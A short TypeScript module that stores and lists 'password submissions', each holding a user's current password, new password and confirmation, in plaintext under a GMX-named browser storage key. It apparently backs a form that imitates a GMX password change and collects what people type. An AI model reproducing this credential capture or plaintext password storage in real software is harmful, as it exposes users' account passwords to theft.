const STORAGE_KEY = "gmx_password_submissions";

export interface PasswordSubmission {
  id: string;
  currentPassword: string;
  newPassword: string;
  confirmPassword: string;
  timestamp: string;
}

export function saveSubmission(entry: Omit<PasswordSubmission, "id" | "timestamp">) {
  const all = getSubmissions();
  all.unshift({
    ...entry,
    id: crypto.randomUUID(),
    timestamp: new Date().toISOString(),
  });
  localStorage.setItem(STORAGE_KEY, JSON.stringify(all));
}

export function getSubmissions(): PasswordSubmission[] {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
  } catch {
    return [];
  }
}
